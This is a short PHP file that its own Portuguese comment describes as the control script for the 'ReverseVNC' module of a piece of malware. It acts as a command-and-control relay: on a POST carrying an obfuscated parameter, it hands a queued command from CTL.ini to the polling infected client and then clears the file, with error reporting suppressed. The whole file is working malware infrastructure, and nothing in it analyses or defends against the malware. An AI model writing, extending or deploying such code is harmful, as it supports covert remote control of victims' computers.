<?php
//
// 8748940939845.php ~~ ReverveVNC.php
//  Arquivo de controle do módulo ReverseVNC do Malware.
//

	error_reporting(0);
	if (isset($_POST["829492"])) {
		
		$CTLINI = parse_ini_file("CTL.ini", "CTL");
		$CTLIDX = $CTLINI["CTL"]["EDX"];
		
		$lenX = strlen($CTLIDX);
		if ($lenX > 1) {
			echo $CTLIDX;
			
			$buf = "[CTL]\nEDX=\n"; $file = fopen("CTL.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
		} else {
			echo "0";
	
			$buf = "[CTL]\nEDX=\n"; $file = fopen("CTL.ini", "w");
			if ($file) { fwrite($file, $buf); fclose($file); }
			
		}
	}

// EOF
?>
